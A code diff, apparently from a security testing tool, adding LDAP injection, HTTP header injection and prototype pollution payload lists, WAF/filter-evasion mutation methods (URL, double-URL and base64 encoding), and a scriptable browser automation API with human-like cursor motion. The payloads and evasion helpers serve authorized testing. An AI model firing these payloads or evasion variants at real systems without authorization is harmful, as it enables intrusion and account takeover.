@@ -1926,6 +1926,40 @@ public sealed class PayloadsApi
         "dict://127.0.0.1:11211/stat",
     ];
 
+    private static readonly IReadOnlyList<string> LdapPayloads =
+    [
+        "*",
+        "*)(uid=*))(|(uid=*",
+        "*)(|(objectclass=*))",
+        "admin*)((|userPassword=*)",
+        "*)(mail=*))%00",
+        ")(cn=*",
+        "*()|%26'",
+        "*)(|(password=*))",
+    ];
+
+    private static readonly IReadOnlyList<string> HeaderInjectionPayloads =
+    [
+        "value\r\nX-Injected: forrest",
+        "value\nX-Injected: forrest",
+        "value%0d%0aX-Injected:%20forrest",
+        "value%0aX-Injected:%20forrest",
+        "value\r\nSet-Cookie: forrest=injected",
+        "value\r\n\r\n<script>alert(1)</script>",
+        "value\tX-Injected: forrest",
+    ];
+
+    private static readonly IReadOnlyList<string> PrototypePollutionPayloads =
+    [
+        "{\"__proto__\":{\"polluted\":true}}",
+        "{\"constructor\":{\"prototype\":{\"polluted\":true}}}",
+        "{\"__proto__.polluted\":true}",
+        "__proto__[polluted]=true",
+        "constructor[prototype][polluted]=true",
+        "{\"__proto__\":{\"isAdmin\":true}}",
+        "{\"__proto__\":{\"toString\":\"polluted\"}}",
+    ];
+
     #endregion
 
     #region Constructors
@@ -1964,6 +1998,12 @@ public sealed class PayloadsApi
 
     public IReadOnlyList<string> Ssrf => SsrfPayloads;
 
+    public IReadOnlyList<string> Ldap => LdapPayloads;
+
+    public IReadOnlyList<string> HeaderInjection => HeaderInjectionPayloads;
+
+    public IReadOnlyList<string> PrototypePollution => PrototypePollutionPayloads;
+
     #endregion
 
     #region Public Methods
@@ -2000,6 +2040,9 @@ public sealed class PayloadsApi
             "nosqli" or "nosql" or "nosql_injection" => NoSqliPayloads,
             "crlf" or "crlf_injection" => CrlfInjectionPayloads,
             "ssrf" => SsrfPayloads,
+            "ldap" or "ldap_injection" => LdapPayloads,
+            "header_injection" or "header" or "response_splitting" => HeaderInjectionPayloads,
+            "prototype_pollution" or "proto" or "prototype" => PrototypePollutionPayloads,
             _ => [],
         };
     }
@@ -2062,6 +2105,9 @@ public sealed class PayloadsApi
             "nosqli",
             "crlf",
             "ssrf",
+            "ldap",
+            "header_injection",
+            "prototype_pollution",
         ];
 
         foreach (string custom in customCategories.Keys)
@@ -2073,6 +2119,65 @@ public sealed class PayloadsApi
         }
 
         return all;
+    }
+
+    /// <summary>
+    /// Expands a single payload into common WAF/filter-evasion variants:
+    /// the original, URL-encoded, double-URL-encoded, base64, upper-case, and
+    /// lower-case forms. Duplicates are removed while preserving order so a
+    /// fuzzer's first hit stays deterministic. Useful for breaking through naive
+    /// input filters during authorized testing.
+    /// </summary>
+    public IReadOnlyList<string> Mutate(string payload)
+    {
+        if (string.IsNullOrEmpty(payload))
+        {
+            return [];
+        }
+
+        List<string> output = [];
+        HashSet<string> seen = new(StringComparer.Ordinal);
+
+        void Add(string candidate)
+        {
+            if (!string.IsNullOrEmpty(candidate) && seen.Add(candidate))
+            {
+                output.Add(candidate);
+            }
+        }
+
+        Add(payload);
+        string urlEncoded = Uri.EscapeDataString(payload);
+        Add(urlEncoded);
+        Add(Uri.EscapeDataString(urlEncoded));
+        Add(Convert.ToBase64String(Encoding.UTF8.GetBytes(payload)));
+        Add(payload.ToUpperInvariant());
+        Add(payload.ToLowerInvariant());
+
+        return output;
+    }
+
+    /// <summary>
+    /// Mutates every payload in a category (or any supplied list) and flattens
+    /// the variants into one deduplicated corpus.
+    /// </summary>
+    public IReadOnlyList<string> MutateAll(IEnumerable<string> payloads)
+    {
+        List<string> output = [];
+        HashSet<string> seen = new(StringComparer.Ordinal);
+
+        foreach (string payload in payloads ?? [])
+        {
+            foreach (string variant in Mutate(payload))
+            {
+                if (seen.Add(variant))
+                {
+                    output.Add(variant);
+                }
+            }
+        }
+
+        return output;
     }
 
     #endregion
@@ -2148,6 +2253,70 @@ public sealed class WorkspaceApi
     }
 }
 
+/// <summary>
+/// The script-facing <c>browser</c> object. Wraps the engine-agnostic <see cref="IBrowserAutomationBridge"/>
+/// so authored and recorded scripts can drive an embedded browser page (navigate, click, type, read,
+/// assert) deterministically — no LLM in the loop at replay time. Targets are compact strings such as
+/// <c>"#id"</c>, <c>"css=.row"</c>, <c>"xpath=//a"</c>, <c>"text=Save"</c>, <c>"role=button:Save"</c>,
+/// or <c>"testid=submit"</c>. Mouse-motion dynamics are tunable via <see cref="MouseSteps"/> and
+/// <see cref="MouseStepDelayMs"/>.
+/// </summary>
+public sealed class ScriptBrowserApi(IBrowserAutomationBridge bridge)
+{
+    #region Properties
+
+    /// <summary>Number of interpolated points the cursor travels through on its way to a target.</summary>
+    public int MouseSteps { get; set; } = 24;
+
+    /// <summary>Delay between cursor steps in milliseconds; raise for slower, more human-like motion.</summary>
+    public int MouseStepDelayMs { get; set; } = 8;
+
+    /// <summary>Whether the visible red cursor overlay animates during moves.</summary>
+    public bool ShowCursor { get; set; } = true;
+
+    /// <summary>Whether a live browser pane is connected.</summary>
+    public bool IsAvailable => bridge.IsAvailable;
+
+    private CursorMotion Motion => new() { Steps = MouseSteps, StepDelayMs = MouseStepDelayMs, Visible = ShowCursor };
+
+    #endregion
+
+    #region Public Methods
+
+    public Task navigate(string url) => bridge.Navigate(url);
+
+    public Task click(string target) => bridge.Click(BrowserTarget.Parse(target), Motion);
+
+    public Task type(string target, string text) => bridge.Type(BrowserTarget.Parse(target), text, Motion);
+
+    public Task press(string keys) => bridge.Press(keys);
+
+    public Task hover(string target) => bridge.Hover(BrowserTarget.Parse(target), Motion);
+
+    public Task<string> getText(string target) => bridge.GetText(BrowserTarget.Parse(target));
+
+    public Task<string> getAttribute(string target, string name) => bridge.GetAttribute(BrowserTarget.Parse(target), name);
+
+    public Task<bool> exists(string target) => bridge.Exists(BrowserTarget.Parse(target));
+
+    public Task<BrowserElementInfo> waitFor(string target, int timeoutMs = 5000) =>
+        bridge.WaitFor(BrowserTarget.Parse(target), timeoutMs);
+
+    public Task scrollTo(string target) => bridge.ScrollTo(BrowserTarget.Parse(target));
+
+    public Task select(string target, string value) => bridge.Select(BrowserTarget.Parse(target), value);
+
+    public Task<BrowserElementInfo> find(string target) => bridge.Query(BrowserTarget.Parse(target));
+
+    public Task<BrowserSnapshot> snapshot() => bridge.Snapshot();
+
+    public Task<string> screenshot() => bridge.Screenshot();
+
+    public Task<string> evaluate(string expression) => bridge.Evaluate(expression);
+
+    #endregion
+}
+
 public sealed class ScriptGlobals
 {
     public required ScriptRequestApi request { get; init; }
@@ -2178,11 +2347,15 @@ public sealed class ScriptGlobals
 
     public required PayloadsApi payloads { get; init; }
 
+    public required FuzzApi fuzz { get; init; }
+
     public required WorkspaceApi workspace { get; init; }
 
     public required dynamic stash { get; init; }
 
     public required SnapshotApi snapshot { get; init; }
+
+    public required ScriptBrowserApi browser { get; init; }
 }
 
 public static class CollectionApi
